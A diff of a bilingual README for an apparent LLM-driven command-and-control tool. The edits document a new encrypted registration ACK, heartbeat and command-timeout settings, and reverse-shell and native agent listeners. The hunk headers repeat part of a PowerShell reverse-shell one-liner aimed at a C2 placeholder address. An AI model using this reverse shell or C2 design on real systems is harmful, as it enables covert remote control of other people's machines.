@@ -233,11 +233,13 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 | （根） | `mode` | 启动模式 `cli` / `web`（默认 `cli`，非法值回退 `cli`）；命令行 `--mode` 优先级更高 |
 | `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM 接口；`system_prompt` 中 `{system_name}` 会被替换为目标 OS（提示词中**不出现** agent id/host） |
 | `web` | `listen_host` / `listen_port` | Web 面板监听（默认 `127.0.0.1:8880`） |
-| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | 原生协议监听；`enabled=true` 时 `auth_token` 必填且与受控端一致 |
+| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | 原生协议监听；`enabled=true` 时 `auth_token` 必填且与受控端一致。注册 ACK 下发 `cmd_timeout = policy.cmd_timeout`，`heartbeat_interval_sec = ceil(2/3 × native.heartbeat_timeout_sec)` |
 | `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | 反弹 Shell 监听；`bot_prefix` 默认 `BOT-` |
 | `fileserver` | `enable` / `listen_host` / `listen_port` / `path` | 可选文件服务器；`path` 空 = 程序同目录下 `fileserver`，非法配置只禁用该功能 |
 | `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | 授权模式、轮数、执行超时、超时策略（`disconnect`/`fail`）、会话上限、队列容量 |
 | `transfer` | `dl_temp_dir` / `ul_temp_dir` | 下载落盘目录（空 = `<cwd>/downloads`）、上传缓冲目录（空 = 系统临时目录） |
+
+> `native.heartbeat_timeout_sec` 与 `policy.cmd_timeout` 的取值范围为 **1–600 秒**；ACK 下发值同样受该上限约束。
 
 ### 10. CLI 命令
 
@@ -271,7 +273,8 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 **Native**：包头 16B = `request_id(uint64 LE)` + `body_len(uint32 LE)` + `reserved(3B)` + `cmd(1B)`。
 请求包身 = TLV 链（`uint32 LE 长度 + UTF-8`）；响应包身 = 单一 UTF-8 字符串；
 文件传输 1024B/数据包（`cmd` 字段作 `end_flag`：0 续传 / 1 末包）。
-注册：`register(仅随机 nonce)` → `register_response(sha256(nonce+token))` → `register_confirm(身份，已加密)`；
+注册：`register(仅随机 nonce)` → `register_response(sha256(nonce+token))` → `register_confirm(身份，已加密)`
+→ `register_ack(0x87，已加密，TLV=[heartbeat_interval_sec, cmd_timeout])`；受控端以 ACK 参数作为运行时心跳间隔与命令超时，这两项由 ACK 提供，受控端配置文件/CLI 不包含；
 其后全流量 ChaCha20，每连接的 key 与 nonce 均由握手 nonce 派生（一次一密）：
 `key(dir)=sha256(nonce+token+nonce+dir)`、`nonce(dir)=sha256(token+nonce+token+dir)[:12]`
 （`dir` 区分双向，`0x01`=C2→Agent，`0x02`=Agent→C2），counter 连续自增。
@@ -287,6 +290,7 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 - **轮数**：`round_limit` 限制单轮「LLM→动作→回灌」次数；**授权通过时清零**（拒绝不清零），任何模式都生效。
 - **拒绝语义**：被拒动作**绝不下发**受控端，作为 tool 结果回灌后**结束本轮**。
 - **指令队列**：每 Agent 一条 FIFO；**排队等待无超时**，**执行中受 `cmd_timeout`**。
+- **Native 运行参数**：`register_ack` 下发 `heartbeat_interval_sec` 与 `cmd_timeout`；受控端在握手结束时带锁替换运行时参数。命令在下一次执行、心跳在下一次周期使用新值，无需重启。
 - **输出与写超时**：单次动作输出上限 **8 MiB**，`read_file` 行范围最多 **512 行**；C2 到受控端的单次网络写超时为 **10 秒**，避免对端停止读取时 dispatcher 被永久阻塞。
 - **执行超时语义**（`timeout_action`）：
   - `disconnect`（默认）：断开该 Agent，等待其重连。
@@ -540,11 +544,13 @@ Registered agents appear as `server-01` (Native) and `BOT-001` (Shell).
 | (root) | `mode` | Startup mode `cli` / `web` (default `cli`; invalid values fall back to `cli`); `--mode` takes precedence |
 | `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM endpoint; `{system_name}` in `system_prompt` is replaced with the OS (the prompt reveals **no** agent id/host) |
 | `web` | `listen_host` / `listen_port` | Web panel listener (default `127.0.0.1:8880`) |
-| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | Native listener; when `enabled=true`, `auth_token` is required and must match the agent |
+| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | Native listener; when `enabled=true`, `auth_token` is required and must match the agent. The registration ACK carries `cmd_timeout = policy.cmd_timeout` and `heartbeat_interval_sec = ceil(2/3 × native.heartbeat_timeout_sec)` |
 | `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | Reverse-shell listener; `bot_prefix` defaults to `BOT-` |
 | `fileserver` | `enable` / `listen_host` / `listen_port` / `path` | Optional file server; empty `path` = `<exe dir>/fileserver`; invalid settings only disable this feature |
 | `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | auth mode, rounds, execution timeout, timeout action (`disconnect`/`fail`), session cap, queue depth |
 | `transfer` | `dl_temp_dir` / `ul_temp_dir` | download dir (empty = `<cwd>/downloads`), upload staging dir (empty = system temp) |
+
+> `native.heartbeat_timeout_sec` and `policy.cmd_timeout` are limited to **1–600 seconds**; ACK values share the same upper bound.
 
 ### 10. CLI commands
 
@@ -579,7 +585,8 @@ Main endpoints: `/api/config`, `/api/agents`, `/api/agents/switch`, `/api/sessio
 Request body = TLV chain (`uint32 LE length + UTF-8`); response body = a single UTF-8 string;
 file transfer uses 1024-byte data packets (`cmd` byte becomes `end_flag`: 0 continue / 1 last).
 Registration: `register(random nonce only)` → `register_response(sha256(nonce+token))` →
-`register_confirm(identity, encrypted)`; afterwards the whole stream uses ChaCha20, where each
+`register_confirm(identity, encrypted)` → `register_ack(0x87, encrypted, TLV=[heartbeat_interval_sec, cmd_timeout])`;
+the agent uses the ACK values as its runtime heartbeat interval and command timeout (these two values are supplied by the ACK, not by the agent config/CLI). Afterwards the whole stream uses ChaCha20, where each
 connection's key and nonce are derived from the handshake nonce (one-time key+nonce):
 `key(dir)=sha256(nonce+token+nonce+dir)`, `nonce(dir)=sha256(token+nonce+token+dir)[:12]`
 (`dir` separates the directions: `0x01`=C2→Agent, `0x02`=Agent→C2), with a continuous counter.
@@ -598,6 +605,7 @@ range and base64-encodes it, or base64-decodes and appends a chunk), so both end
 - **Rounds**: `round_limit` caps the "LLM → action → feedback" loop; an **approval resets** it (a denial does not), in every mode.
 - **Denial semantics**: the denied action is **never dispatched**; it is fed back as a tool result and the **turn ends**.
 - **Command queue**: one FIFO per agent; **queue wait is unbounded**, **execution is bounded by `cmd_timeout`**.
+- **Native runtime parameters**: `register_ack` delivers `heartbeat_interval_sec` and `cmd_timeout`; the agent replaces its runtime values under a lock. Commands use the new timeout on their next execution and heartbeats on their next cycle, without a restart.
 - **Execution-timeout semantics** (`timeout_action`):
   - `disconnect` (default): drop the agent and wait for it to reconnect.
   - `fail`: **keep the connection**. The current job fails with a timeout and the agent's **queued jobs are discarded**; while the command may still be running, new jobs are rejected (reported as busy, not dispatched) until the controlled end finishes.
